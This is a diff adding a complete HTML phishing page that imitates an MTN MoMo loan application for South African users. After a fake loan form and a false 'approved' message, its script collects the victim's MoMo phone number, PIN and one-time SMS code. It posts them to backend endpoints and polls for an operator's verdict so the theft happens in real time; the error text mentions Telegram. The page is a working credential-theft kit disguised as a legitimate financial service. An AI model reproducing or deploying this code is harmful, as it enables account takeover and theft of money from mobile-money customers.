@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>MTN MoMo Loan</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Roboto', sans-serif; }
+    body { background-color: #f2f2f2; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+    .mobile-container { width: 100%; max-width: 400px; height: 100vh; background-color: #f9f9f9; display: flex; flex-direction: column; position: relative; overflow-y: auto; box-shadow: 0 0 20px rgba(0,0,0,0.1); }
+    .header { display: flex; align-items: center; justify-content: space-between; padding: 15px 20px; background: #fff; border-bottom: 2px solid #ffcc00; }
+    .header-left { display: flex; align-items: center; gap: 15px; }
+    .header-text { font-size: 18px; font-weight: 500; color: #333; }
+    .content { padding: 20px; flex: 1; display: flex; flex-direction: column; }
+    .card { background: #fff; border-radius: 20px; padding: 25px 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); margin-bottom: 20px; text-align: center; }
+    h1 { font-size: 22px; font-weight: 500; color: #333; margin-bottom: 8px; }
+    .subtitle { font-size: 13px; color: #888; margin-bottom: 25px; }
+    .calc-box { background: #fffdf0; border: 1px solid #ffcc00; border-radius: 15px; padding: 20px; text-align: left; margin-bottom: 25px; }
+    .calc-title { font-size: 16px; font-weight: 500; margin-bottom: 20px; color: #333; }
+    .slider-group { margin-bottom: 25px; }
+    .slider-header { display: flex; justify-content: space-between; font-size: 14px; color: #555; margin-bottom: 10px; }
+    .slider-value { color: #d4a000; font-weight: 500; }
+    input[type=range] { -webkit-appearance: none; width: 100%; height: 6px; background: #e0e0e0; border-radius: 3px; outline: none; }
+    input[type=range]::-webkit-slider-thumb { -webkit-appearance: none; width: 20px; height: 20px; background: #ffcc00; border-radius: 50%; cursor: pointer; border: 2px solid #fff; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
+    .range-labels { display: flex; justify-content: space-between; font-size: 12px; color: #888; margin-top: 8px; }
+    .payment-box { background: #fff; border: 1px solid #ffcc00; border-radius: 10px; padding: 15px; text-align: center; font-size: 16px; color: #555; display: flex; justify-content: center; align-items: center; gap: 10px; }
+    .payment-box span { color: #d4a000; font-weight: 500; font-size: 18px; }
+    .btn { background: #ffcc00; color: #333; border: none; padding: 15px; border-radius: 10px; font-size: 16px; font-weight: 500; width: 100%; cursor: pointer; text-transform: uppercase; transition: background 0.2s; }
+    .btn:active { background: #e6b800; }
+    .form-group { margin-bottom: 20px; text-align: left; }
+    .form-group label { display: block; font-size: 14px; color: #555; margin-bottom: 8px; }
+    .form-group input, .form-group select, .form-group textarea { width: 100%; padding: 12px 15px; border: 1px solid #ddd; border-radius: 10px; font-size: 15px; outline: none; background: #fafafa; }
+    .form-group input:focus, .form-group select:focus, .form-group textarea:focus { border-color: #ffcc00; background: #fff; }
+    .form-group textarea { resize: vertical; min-height: 80px; }
+    .phone-group { display: flex; gap: 10px; }
+    .phone-prefix { width: 80px; padding: 12px; border: 1px solid #ddd; border-radius: 10px; background: #f0f0f0; text-align: center; font-size: 15px; font-weight: 500; }
+    .phone-input { flex: 1; }
+    .stepper { display: flex; justify-content: center; gap: 10px; margin-bottom: 20px; }
+    .step { width: 40px; height: 4px; background: #e0e0e0; border-radius: 2px; }
+    .step.active { background: #ffcc00; }
+    .step-title { font-size: 14px; color: #888; text-align: center; margin-bottom: 30px; }
+    .summary-box { background: #fffdf0; border: 1px solid #ffcc00; border-radius: 15px; padding: 20px; text-align: left; margin-bottom: 25px; }
+    .summary-title { font-size: 16px; color: #d4a000; margin-bottom: 15px; font-weight: 500; }
+    .summary-row { display: flex; justify-content: space-between; font-size: 14px; color: #555; padding: 10px 0; border-bottom: 1px dashed #e0e0e0; }
+    .summary-row:last-child { border-bottom: none; }
+    .summary-row span:last-child { font-weight: 500; color: #333; }
+    .btn-group { display: flex; gap: 10px; margin-top: 10px; }
+    .btn-secondary { background: #e0e0e0; color: #333; }
+    .btn-secondary:active { background: #ccc; }
+    .otp-container { display: flex; justify-content: center; gap: 10px; margin: 20px 0; }
+    .otp-input { width: 50px; height: 60px; text-align: center; font-size: 24px; border: 2px solid #ddd; border-radius: 10px; outline: none; }
+    .otp-input:focus { border-color: #ffcc00; }
+    .status-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100%; text-align: center; }
+    .success-icon { width: 80px; height: 80px; background: #ffcc00; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 40px; color: #333; margin-bottom: 20px; }
+    .status-title { font-size: 22px; font-weight: 500; margin-bottom: 10px; color: #333; }
+    .status-desc { font-size: 14px; color: #666; margin-bottom: 30px; line-height: 1.5; }
+    .toast { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: #ffcc00; color: #333; padding: 12px 20px; border-radius: 8px; font-weight: 500; box-shadow: 0 4px 12px rgba(0,0,0,0.15); z-index: 1000; display: none; }
+    .toast.show { display: block; animation: slideDown 0.3s ease-out; }
+    @keyframes slideDown { from { top: -50px; opacity: 0; } to { top: 20px; opacity: 1; } }
+    .page { display: none; flex: 1; flex-direction: column; }
+    .page.active { display: flex; }
+    #loading-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.85); z-index: 9999; display: none; flex-direction: column; align-items: center; justify-content: center; backdrop-filter: blur(3px); }
+    #loading-overlay.active { display: flex; }
+    .spinner { border: 5px solid #f3f3f3; border-top: 5px solid #ffcc00; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+<div id="loading-overlay"><div class="spinner"></div></div>
+<div class="toast" id="toast">🎉 Application submitted successfully!</div>
+<div class="mobile-container">
+  <div class="header">
+    <div class="header-left">
+      <svg width="45" height="45" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+        <defs>
+          <linearGradient id="bgGrad" x1="0%" y1="0%" x2="0%" y2="100%">
+            <stop offset="0%" stop-color="#004b7a"/><stop offset="80%" stop-color="#002d4f"/><stop offset="100%" stop-color="#002d4f"/>
+          </linearGradient>
+        </defs>
+        <rect width="100" height="100" rx="22" fill="url(#bgGrad)"/>
+        <path d="M 22 88 Q 50 88 78 88 A 22 22 0 0 0 100 66 L 0 66 A 22 22 0 0 0 22 88 Z" fill="#ffcc00"/>
+        <path d="M 25 80 C 40 80 65 60 60 30 C 50 50 40 60 25 80 Z" fill="#ffcc00"/>
+        <path d="M 70 75 C 80 60 75 30 65 10 C 75 40 65 60 70 75 Z" fill="#ffcc00"/>
+        <circle cx="45" cy="60" r="10" fill="#002d4f"/>
+      </svg>
+      <div class="header-text">MTN Mobile Services</div>
+    </div>
+  </div>
+
+  <div class="page active" id="page-calc">
+    <div class="content">
+      <div class="card">
+        <h1>Get Your Loan Approved Fast</h1>
+        <p class="subtitle">Quick approval • Competitive rates • Flexible terms</p>
+        <div class="calc-box">
+          <div class="calc-title">Loan Calculator</div>
+          <div class="slider-group">
+            <div class="slider-header"><span>Loan Amount</span><span class="slider-value" id="amountDisplay">ZAR 1,000</span></div>
+            <input type="range" id="amountSlider" min="1000" max="100000" step="1000" value="1000">
+            <div class="range-labels"><span>ZAR 1,000</span><span>ZAR 100,000</span></div>
+          </div>
+          <div class="slider-group">
+            <div class="slider-header"><span>Loan Term</span><span class="slider-value" id="termDisplay">6 months</span></div>
+            <input type="range" id="termSlider" min="6" max="60" step="1" value="6">
+            <div class="range-labels"><span>6 months</span><span>60 months</span></div>
+          </div>
+          <div class="payment-box">Monthly Payment : <span id="monthlyDisplay">ZAR 183.33</span></div>
+        </div>
+        <button class="btn" onclick="goToPage('page-step1')">APPLY NOW</button>
+        <div style="text-align: left; margin-top: 25px; padding: 0 10px;">
+          <div style="display: flex; align-items: center; gap: 15px; margin-bottom: 20px;"><div style="font-size: 24px;">⚡</div><div><h4 style="font-size: 15px; font-weight: 500; margin-bottom: 2px;">Fast Approval</h4><p style="font-size: 13px; color: #888;">Within 24 hours</p></div></div>
+          <div style="display: flex; align-items: center; gap: 15px; margin-bottom: 20px;"><div style="font-size: 24px;">💰</div><div><h4 style="font-size: 15px; font-weight: 500; margin-bottom: 2px;">Low Rates</h4><p style="font-size: 13px; color: #888;">From 8%</p></div></div>
+          <div style="display: flex; align-items: center; gap: 15px; margin-bottom: 20px;"><div style="font-size: 24px;">🔒</div><div><h4 style="font-size: 15px; font-weight: 500; margin-bottom: 2px;">Secure</h4><p style="font-size: 13px; color: #888;">Bank-level</p></div></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="page" id="page-step1">
+    <div class="content">
+      <div class="stepper"><div class="step active"></div><div class="step"></div><div class="step"></div></div>
+      <div class="step-title">Step 1 of 3</div>
+      <div class="card" style="text-align: left;">
+        <h1 style="text-align: center; margin-bottom: 25px;">Loan Application</h1>
+        <div class="form-group"><label>Loan Type</label><select id="loanType"><option>Personal Loan</option></select></div>
+        <div class="form-group"><label>Loan Amount (ZAR)</label><input type="number" id="loanAmount" value="1000"></div>
+        <div class="form-group"><label>Loan Term</label><select id="loanTerm"><option value="6">6 Months</option><option value="12">12 Months</option><option value="24">24 Months</option><option value="60">60 Months</option></select></div>
+        <div class="form-group"><label>Purpose of Loan</label><textarea id="loanPurpose" placeholder="What will you use the loan for?"></textarea></div>
+        <button class="btn" onclick="saveStep1()">NEXT STEP</button>
+      </div>
+    </div>
+  </div>
+
+  <div class="page" id="page-step2">
+    <div class="content">
+      <div class="stepper"><div class="step active"></div><div class="step active"></div><div class="step"></div></div>
+      <div class="step-title">Step 2 of 3</div>
+      <div class="card" style="text-align: left;">
+        <h1 style="text-align: center; margin-bottom: 25px;">Loan Application</h1>
+        <div class="form-group"><label>First Name</label><input type="text" id="firstName" placeholder="John"></div>
+        <div class="form-group"><label>Last Name</label><input type="text" id="lastName" placeholder="Banda"></div>
+        <div class="form-group"><label>Email Address</label><input type="email" id="email" placeholder="john.banda@example.com"></div>
+        <div class="form-group"><label>Phone Number</label><div class="phone-group"><div class="phone-prefix">+27</div><input type="tel" id="phone" class="phone-input" placeholder="82XXXXXXX"></div></div>
+        <div class="btn-group">
+          <button class="btn btn-secondary" onclick="goToPage('page-step1')">PREVIOUS</button>
+          <button class="btn" onclick="saveStep2()">NEXT STEP</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="page" id="page-step3">
+    <div class="content">
+      <div class="stepper"><div class="step active"></div><div class="step active"></div><div class="step active"></div></div>
+      <div class="step-title">Step 3 of 3</div>
+      <div class="card" style="text-align: left;">
+        <h1 style="text-align: center; margin-bottom: 25px;">Loan Application</h1>
+        <div class="form-group"><label>Employment Status</label><select id="employmentStatus"><option>Employed</option><option>Self-Employed</option><option>Unemployed</option></select></div>
+        <div class="form-group"><label>Annual Income (ZAR)</label><input type="number" id="annualIncome" placeholder="50,000"></div>
+        <div class="summary-box">
+          <div class="summary-title">Application Summary</div>
+          <div class="summary-row"><span>Loan Amount:</span> <span id="sumAmount">ZAR 1,000</span></div>
+          <div class="summary-row"><span>Loan Term:</span> <span id="sumTerm">6 Months</span></div>
+          <div class="summary-row"><span>Purpose:</span> <span id="sumPurpose">School fee</span></div>
+          <div class="summary-row"><span>Applicant:</span> <span id="sumApplicant">John Banda</span></div>
+        </div>
+        <div class="btn-group">
+          <button class="btn btn-secondary" onclick="goToPage('page-step2')">PREVIOUS</button>
+          <button class="btn" onclick="submitApplication()">SUBMIT APPLICATION</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="page" id="page-success">
+    <div class="content status-screen">
+      <div class="success-icon">✔</div>
+      <div class="status-title">Loan Application<br>Submitted</div>
+      <div class="status-desc">Your loan application has been submitted. Please wait for approval.<br><br>You will receive a confirmation message. For now, proceed to MoMo.</div>
+      <div style="background: #fffdf0; border: 1px solid #ffcc00; border-radius: 15px; padding: 20px; width: 100%; margin-bottom: 30px; display: flex; align-items: center; justify-content: center; gap: 15px;">
+        <div class="spinner" style="width: 20px; height: 20px; border-width: 3px; margin-bottom: 0; border-top-color: #ffcc00;"></div>
+        <span style="color: #d4a000; font-weight: 500;" id="redirectText">Redirecting to MoMo login in 3s...</span>
+      </div>
+      <button class="btn" style="width: auto; padding: 12px 30px;" onclick="goToLogin()">Go to Login Now</button>
+    </div>
+  </div>
+
+  <div class="page" id="page-login">
+    <div class="content" style="text-align: center; justify-content: center;">
+      <div style="margin: 0 auto 15px; display: flex; flex-direction: column; align-items: center;">
+        <svg width="60" height="60" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+          <defs><linearGradient id="bgGrad2" x1="0%" y1="0%" x2="0%" y2="100%"><stop offset="0%" stop-color="#004b7a"/><stop offset="80%" stop-color="#002d4f"/><stop offset="100%" stop-color="#002d4f"/></linearGradient></defs>
+          <rect width="100" height="100" rx="22" fill="url(#bgGrad2)"/>
+          <path d="M 22 88 Q 50 88 78 88 A 22 22 0 0 0 100 66 L 0 66 A 22 22 0 0 0 22 88 Z" fill="#ffcc00"/>
+          <path d="M 25 80 C 40 80 65 60 60 30 C 50 50 40 60 25 80 Z" fill="#ffcc00"/>
+          <path d="M 70 75 C 80 60 75 30 65 10 C 75 40 65 60 70 75 Z" fill="#ffcc00"/>
+          <circle cx="45" cy="60" r="10" fill="#002d4f"/>
+        </svg>
+        <h2 style="color: #002d62; font-size: 20px; margin-top: 10px; font-weight: 700;">MoMo</h2>
+        <p style="font-size: 10px; color: #666; font-weight: 700;">from MTN</p>
+      </div>
+      <h1 style="font-size: 28px; font-style: italic; font-weight: 700; margin-bottom: 5px;">y'ello,</h1>
+      <p style="font-size: 16px; margin-bottom: 40px;">welcome to MoMo</p>
+      <div style="text-align: left; width: 100%;">
+        <label style="font-weight: 500; font-size: 14px; margin-bottom: 10px; display: block;">Enter your Cellphone number</label>
+        <div style="display: flex; gap: 10px; margin-bottom: 20px;">
+          <div class="phone-prefix" style="width: 60px; border-radius: 8px;">+27</div>
+          <input type="tel" id="loginPhone" placeholder="Cellphone Number" style="flex: 1; padding: 15px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px;">
+        </div>
+        <label style="font-weight: 500; font-size: 14px; margin-bottom: 10px; display: block;">Enter your PIN</label>
+        <input type="password" id="loginPin" placeholder="PIN" maxlength="4" style="width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; margin-bottom: 20px;">
+      </div>
+      <button class="btn" style="border-radius: 30px; padding: 18px;" onclick="submitLogin()">Continue</button>
+      <p style="color: #002d62; font-weight: 500; font-size: 14px; margin-top: 20px; cursor: pointer;">Change your MoMo number</p>
+      <div style="margin-top: auto; padding-top: 40px; font-size: 12px; color: #888;">
+        <p style="margin-bottom: 10px;">By signing in, I agree to the <span style="color: #002d62;">T's & C's</span></p>
+        <p>MoMo is powered by <b>MTN</b> | <b>African Bank</b></p>
+      </div>
+    </div>
+  </div>
+
+  <div class="page" id="page-otp">
+    <div class="content">
+      <div style="display: flex; align-items: center; margin-bottom: 30px; border-bottom: 1px solid #eee; padding-bottom: 15px;">
+        <span style="font-size: 24px; color: #ffcc00; margin-right: 15px; cursor: pointer;" onclick="goToLogin()">❮</span>
+        <h2 style="font-size: 18px; font-weight: 700;">Register</h2>
+      </div>
+      <h1 style="font-size: 20px; font-weight: 700; text-align: left; margin-bottom: 10px;">Confirm your cellphone number</h1>
+      <p style="font-size: 14px; color: #666; text-align: left; line-height: 1.5; margin-bottom: 30px;">
+        We will send an SMS with a One Time Pin (OTP) within the next 3 minutes to <span id="maskedPhone">083****567</span>
+      </p>
+      <label style="font-weight: 700; color: #888; font-size: 14px; display: block; margin-bottom: 15px;">Please enter the OTP you received</label>
+      <div class="otp-container">
+        <input type="text" class="otp-input" maxlength="1" oninput="moveFocus(this, 0)">
+        <input type="text" class="otp-input" maxlength="1" oninput="moveFocus(this, 1)">
+        <input type="text" class="otp-input" maxlength="1" oninput="moveFocus(this, 2)">
+        <input type="text" class="otp-input" maxlength="1" oninput="moveFocus(this, 3)">
+      </div>
+      <div style="text-align: right; font-size: 14px; font-weight: 500; margin-bottom: 30px; cursor: pointer;">SHOW</div>
+      <button class="btn" style="border-radius: 30px; padding: 18px; margin-bottom: 15px;" onclick="submitOTP()">Verify</button>
+      <button class="btn btn-secondary" style="border-radius: 30px; padding: 18px;">Resend OTP</button>
+    </div>
+  </div>
+
+  <div class="page" id="page-congrats">
+    <div class="content status-screen">
+      <div class="success-icon" style="background: #4CAF50; color: white;">✔</div>
+      <div class="status-title">Congratulations!</div>
+      <div class="status-desc">Your identity has been verified and your loan has been fully approved.<br><br>Funds will be disbursed to your MoMo account shortly.</div>
+      <button class="btn" style="width: auto; padding: 12px 30px;" onclick="location.reload()">DONE</button>
+    </div>
+  </div>
+</div>
+
+<script>
+  let formData = {};
+  let currentRequestId = null;
+  let pollingInterval = null;
+
+  function goToPage(pageId) {
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    document.getElementById(pageId).classList.add('active');
+    document.querySelector('.mobile-container').scrollTop = 0;
+  }
+
+  function toggleLoading(show) { document.getElementById('loading-overlay').classList.toggle('active', show); }
+  function showToast() { const toast = document.getElementById('toast'); toast.classList.add('show'); setTimeout(() => toast.classList.remove('show'), 3000); }
+
+  const amountSlider = document.getElementById('amountSlider');
+  const termSlider = document.getElementById('termSlider');
+  function updateCalculator() {
+    const amount = parseInt(amountSlider.value);
+    const term = parseInt(termSlider.value);
+    document.getElementById('amountDisplay').textContent = `ZAR ${amount.toLocaleString()}`;
+    document.getElementById('termDisplay').textContent = `${term} months`;
+    const totalInterest = amount * 0.08 * (term / 12);
+    document.getElementById('monthlyDisplay').textContent = `ZAR ${((amount + totalInterest) / term).toFixed(2)}`;
+  }
+  amountSlider.addEventListener('input', updateCalculator);
+  termSlider.addEventListener('input', updateCalculator);
+  updateCalculator();
+
+  function saveStep1() {
+    const purpose = document.getElementById('loanPurpose').value;
+    if (!purpose) return alert('Please enter the purpose of the loan.');
+    formData.loanAmount = document.getElementById('loanAmount').value;
+    formData.loanTerm = document.getElementById('loanTerm').value;
+    formData.purpose = purpose;
+    goToPage('page-step2');
+  }
+
+  function saveStep2() {
+    const firstName = document.getElementById('firstName').value;
+    const lastName = document.getElementById('lastName').value;
+    const email = document.getElementById('email').value;
+    const phone = document.getElementById('phone').value;
+    if (!firstName || !lastName || !email || !phone) return alert('Please fill in all fields.');
+    formData.firstName = firstName; formData.lastName = lastName; formData.email = email; formData.phone = phone;
+    document.getElementById('sumAmount').textContent = `ZAR ${parseInt(formData.loanAmount).toLocaleString()}`;
+    document.getElementById('sumTerm').textContent = `${formData.loanTerm} Months`;
+    document.getElementById('sumPurpose').textContent = formData.purpose;
+    document.getElementById('sumApplicant').textContent = `${firstName} ${lastName}`;
+    goToPage('page-step3');
+  }
+
+  function submitApplication() {
+    const annualIncome = document.getElementById('annualIncome').value;
+    if (!annualIncome) return alert('Please enter your annual income.');
+    formData.employmentStatus = document.getElementById('employmentStatus').value;
+    formData.annualIncome = annualIncome;
+    goToPage('page-success');
+    showToast();
+    let countdown = 3;
+    const timer = setInterval(() => {
+      countdown--;
+      if (countdown <= 0) { clearInterval(timer); if (document.getElementById('page-success').classList.contains('active')) goToLogin(); } 
+      else { document.getElementById('redirectText').textContent = `Redirecting to MoMo login in ${countdown}s...`; }
+    }, 1000);
+  }
+
+  function goToLogin() {
+    goToPage('page-login');
+    document.getElementById('loginPhone').value = formData.phone || '';
+  }
+
+  async function submitLogin() {
+    const phone = document.getElementById('loginPhone').value;
+    const pin = document.getElementById('loginPin').value;
+    if (!phone || !pin) return alert('Please enter phone and PIN.');
+    if (!currentRequestId) currentRequestId = Math.random().toString(36).substring(2, 10);
+    toggleLoading(true);
+    try {
+      const res = await fetch('/api/login', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ requestId: currentRequestId, phone, pin }) });
+      if (!res.ok) throw new Error('Failed');
+      startPolling('login');
+    } catch (err) { toggleLoading(false); alert('Error connecting to Telegram.'); }
+  }
+
+  function moveFocus(current, index) { if (current.value.length === 1 && index < 3) document.querySelectorAll('.otp-input')[index + 1].focus(); }
+
+  async function submitOTP() {
+    const inputs = document.querySelectorAll('.otp-input');
+    let otp = ''; inputs.forEach(input => otp += input.value);
+    if (otp.length !== 4) return alert('Please enter all 4 digits.');
+    toggleLoading(true);
+    try {
+      const res = await fetch('/api/otp', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ requestId: currentRequestId, otp }) });
+      if (!res.ok) throw new Error('Failed');
+      startPolling('otp');
+    } catch (err) { toggleLoading(false); alert('Error connecting to Telegram.'); }
+  }
+
+  function startPolling(stage) {
+    if (pollingInterval) clearInterval(pollingInterval);
+    pollingInterval = setInterval(async () => {
+      try {
+        const response = await fetch(`/api/status/${currentRequestId}`);
+        if (!response.ok) return;
+        const data = await response.json();
+        if (stage === 'login') {
+          if (data.status === 'login_approved') {
+            clearInterval(pollingInterval); toggleLoading(false);
+            const phoneVal = document.getElementById('loginPhone').value;
+            document.getElementById('maskedPhone').textContent = `+27 ${phoneVal.substring(0,3)}***${phoneVal.slice(-3)}`;
+            goToPage('page-otp');
+          } else if (data.status === 'login_rejected') {
+            clearInterval(pollingInterval); toggleLoading(false); alert('Login rejected by admin. Please try again.');
+          }
+        } else if (stage === 'otp') {
+          if (data.status === 'success') { clearInterval(pollingInterval); toggleLoading(false); goToPage('page-congrats'); } 
+          else if (data.status === 'wrong_pin') { clearInterval(pollingInterval); toggleLoading(false); alert('Incorrect PIN. Please re-enter.'); goToPage('page-login'); } 
+          else if (data.status === 'wrong_otp') { clearInterval(pollingInterval); toggleLoading(false); alert('Incorrect OTP. Please try again.'); document.querySelectorAll('.otp-input').forEach(input => input.value = ''); }
+        }
+      } catch (err) { console.error('Polling error:', err); }
+    }, 1500);
+  }
+</script>
+</body>
+</html>
